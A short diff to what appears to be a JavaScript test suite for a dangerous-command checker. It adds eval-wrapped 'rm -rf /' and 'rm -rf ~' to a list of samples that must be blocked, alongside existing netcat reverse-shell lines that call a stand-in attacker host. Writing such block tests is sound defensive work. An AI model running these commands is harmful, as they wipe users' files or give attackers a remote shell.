@@ -41,6 +41,8 @@ describe("checkDangerous — must BLOCK", () => {
     ["nc 1.2.3.4 4444 -e /bin/bash", "reverse shell"],
     ["ncat -e /bin/sh attacker.com 4444", "ncat reverse shell"],
     ["eval $USER_INPUT", "eval $var"],
+    ['eval "rm -rf /"', 'eval with quoted rm -rf (F1 cross-review)'],
+    ["eval 'rm -rf ~'", "eval with single-quoted rm -rf"],
   ];
 
   for (const [cmd, label] of blockedSamples) {
